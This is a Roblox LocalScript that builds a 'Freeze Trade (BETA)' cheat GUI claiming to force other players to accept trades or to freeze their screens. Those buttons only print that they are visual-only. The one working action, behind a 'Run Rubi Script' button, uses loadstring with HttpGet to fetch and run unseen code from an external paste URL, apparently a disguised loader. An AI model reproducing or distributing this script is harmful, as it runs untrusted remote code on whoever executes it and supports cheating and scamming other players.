-- This is a LocalScript. It can be placed in StarterPlayer > StarterPlayerScripts.

-- Create the main ScreenGui to hold the elements
local screenGui = Instance.new("ScreenGui")
screenGui.Parent = game.Players.LocalPlayer:WaitForChild("PlayerGui")
screenGui.ZIndexBehavior = Enum.ZIndexBehavior.Sibling
screenGui.ResetOnSpawn = false -- So the UI doesn't disappear when the player respawns

-- Create the main background frame
local mainFrame = Instance.new("Frame")
mainFrame.Parent = screenGui
mainFrame.Size = UDim2.new(0, 350, 0, 240)
mainFrame.Position = UDim2.new(0.5, -175, 0.5, -120)
mainFrame.BackgroundColor3 = Color3.fromRGB(39, 42, 44)
mainFrame.BackgroundTransparency = 0.3
mainFrame.BorderColor3 = Color3.fromRGB(0, 0, 0)
mainFrame.BorderSizePixel = 0
mainFrame.Visible = false
mainFrame.Active = true
mainFrame.Draggable = true

local frameCorner = Instance.new("UICorner")
frameCorner.CornerRadius = UDim.new(0, 12)
frameCorner.Parent = mainFrame

local shadowFrame = Instance.new("Frame")
shadowFrame.Parent = mainFrame
shadowFrame.Position = UDim2.new(0, 0, 0, 4)
shadowFrame.Size = UDim2.new(1, 0, 1, 0)
shadowFrame.BackgroundColor3 = Color3.fromRGB(20, 22, 23)
shadowFrame.BackgroundTransparency = 0.3
shadowFrame.ZIndex = -1

local shadowCorner = Instance.new("UICorner")
shadowCorner.CornerRadius = UDim.new(0, 12)
shadowCorner.Parent = shadowFrame

local titleLabel = Instance.new("TextLabel")
titleLabel.Parent = mainFrame
titleLabel.Size = UDim2.new(1, -40, 0, 40)
titleLabel.Position = UDim2.new(0, 0, 0, 5)
titleLabel.BackgroundTransparency = 1
titleLabel.TextColor3 = Color3.fromRGB(255, 255, 255)
titleLabel.Font = Enum.Font.SourceSansBold
titleLabel.Text = "Freeze Trade (BETA)"
titleLabel.TextSize = 22

local usernameInput = Instance.new("TextBox")
usernameInput.Parent = mainFrame
usernameInput.Size = UDim2.new(0, 310, 0, 40)
usernameInput.Position = UDim2.new(0.5, -155, 0, 55)
usernameInput.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
usernameInput.TextColor3 = Color3.fromRGB(127, 129, 131)
usernameInput.Font = Enum.Font.SourceSans
usernameInput.Text = "Put Target Player's Username"
usernameInput.TextSize = 18
usernameInput.ClearTextOnFocus = true

local inputCorner = Instance.new("UICorner")
inputCorner.CornerRadius = UDim.new(0, 8)
inputCorner.Parent = usernameInput

local forceAcceptButton = Instance.new("TextButton")
forceAcceptButton.Parent = mainFrame
forceAcceptButton.Size = UDim2.new(0, 310, 0, 35)
forceAcceptButton.Position = UDim2.new(0.5, -155, 0, 105)
forceAcceptButton.BackgroundColor3 = Color3.fromRGB(22, 160, 133)
forceAcceptButton.TextColor3 = Color3.fromRGB(255, 255, 255)
forceAcceptButton.Font = Enum.Font.SourceSansBold
forceAcceptButton.Text = "AUTO FORCE TO ACCEPT/CONFIRM"
forceAcceptButton.TextSize = 16

local acceptCorner = Instance.new("UICorner")
acceptCorner.CornerRadius = UDim.new(0, 8)
acceptCorner.Parent = forceAcceptButton

local freezeButton = Instance.new("TextButton")
freezeButton.Parent = mainFrame
freezeButton.Size = UDim2.new(0, 310, 0, 35)
freezeButton.Position = UDim2.new(0.5, -155, 0, 150)
freezeButton.BackgroundColor3 = Color3.fromRGB(26, 188, 156)
freezeButton.TextColor3 = Color3.fromRGB(255, 255, 255)
freezeButton.Font = Enum.Font.SourceSansBold
freezeButton.Text = "FREEZE PLAYER SCREEN"
freezeButton.TextSize = 16

local freezeCorner = Instance.new("UICorner")
freezeCorner.CornerRadius = UDim.new(0, 8)
freezeCorner.Parent = freezeButton

-- NEW: Create a button to run Rubi script
local rubiButton = Instance.new("TextButton")
rubiButton.Parent = mainFrame
rubiButton.Size = UDim2.new(0, 310, 0, 35)
rubiButton.Position = UDim2.new(0.5, -155, 0, 195)
rubiButton.BackgroundColor3 = Color3.fromRGB(155, 89, 182)
rubiButton.TextColor3 = Color3.fromRGB(255, 255, 255)
rubiButton.Font = Enum.Font.SourceSansBold
rubiButton.Text = "Run Rubi Script"
rubiButton.TextSize = 16

local rubiCorner = Instance.new("UICorner")
rubiCorner.CornerRadius = UDim.new(0, 8)
rubiCorner.Parent = rubiButton

local closeButton = Instance.new("TextButton")
closeButton.Parent = mainFrame
closeButton.Size = UDim2.new(0, 30, 0, 30)
closeButton.Position = UDim2.new(1, -35, 0, 5)
closeButton.BackgroundColor3 = Color3.fromRGB(231, 76, 60)
closeButton.TextColor3 = Color3.fromRGB(255, 255, 255)
closeButton.Font = Enum.Font.SourceSansBold
closeButton.Text = "X"
closeButton.TextSize = 20

local closeCorner = Instance.new("UICorner")
closeCorner.CornerRadius = UDim.new(0, 8)
closeCorner.Parent = closeButton

local toggleButton = Instance.new("TextButton")
toggleButton.Parent = screenGui
toggleButton.Size = UDim2.new(0, 120, 0, 40)
toggleButton.Position = UDim2.new(0, 15, 0, 15)
toggleButton.BackgroundColor3 = Color3.fromRGB(52, 152, 219)
toggleButton.TextColor3 = Color3.fromRGB(255, 255, 255)
toggleButton.Font = Enum.Font.SourceSansBold
toggleButton.Text = "Toggle UI"
toggleButton.TextSize = 18
toggleButton.Draggable = true
toggleButton.Active = true

local toggleCorner = Instance.new("UICorner")
toggleCorner.CornerRadius = UDim.new(0, 8)
toggleCorner.Parent = toggleButton

--- SCRIPT FUNCTIONALITY ---

forceAcceptButton.MouseButton1Click:Connect(function()
    print("Attempted to use 'Force Accept' on player: " .. usernameInput.Text)
    print("REMINDER: This is a visual-only GUI. No action was performed.")
end)

freezeButton.MouseButton1Click:Connect(function()
    print("Attempted to use 'Freeze Screen' on player: " .. usernameInput.Text)
    print("REMINDER: This is a visual-only GUI. No action was performed.")
end)

rubiButton.MouseButton1Click:Connect(function()
    loadstring(game:HttpGet("https://api.rubis.app/v2/scrap/iru8Oy63epzxj75l/raw", true))()
end)

toggleButton.MouseButton1Click:Connect(function()
    mainFrame.Visible = not mainFrame.Visible
end)

closeButton.MouseButton1Click:Connect(function()
    mainFrame.Visible = false
end)

local UserInputService = game:GetService("UserInputService")
local function makeDraggable(guiObject)
    local dragging = false
    local dragInput = nil
    local dragStart = nil
    local startPos = nil

    guiObject.InputBegan:Connect(function(input)
        if (input.UserInputType == Enum.UserInputType.MouseButton1 or input.UserInputType == Enum.UserInputType.Touch) and guiObject.Draggable then
            dragging = true
            dragStart = input.Position
            startPos = guiObject.Position
            
            local connection
            connection = input.Changed:Connect(function()
                if input.UserInputState == Enum.UserInputState.End then
                    dragging = false
                    connection:Disconnect()
                end
            end)
        end
    end)

    guiObject.InputChanged:Connect(function(input)
        if (input.UserInputType == Enum.UserInputType.MouseMovement or input.UserInputType == Enum.UserInputType.Touch) then
            dragInput = input
        end
    end)

    UserInputService.InputChanged:Connect(function(input)
        if input == dragInput and dragging then
            local delta = input.Position - dragStart
            guiObject.Position = UDim2.new(startPos.X.Scale, startPos.X.Offset + delta.X, startPos.Y.Scale, startPos.Y.Offset + delta.Y)
        end
    end)
end

makeDraggable(mainFrame)
makeDraggable(toggleButton)
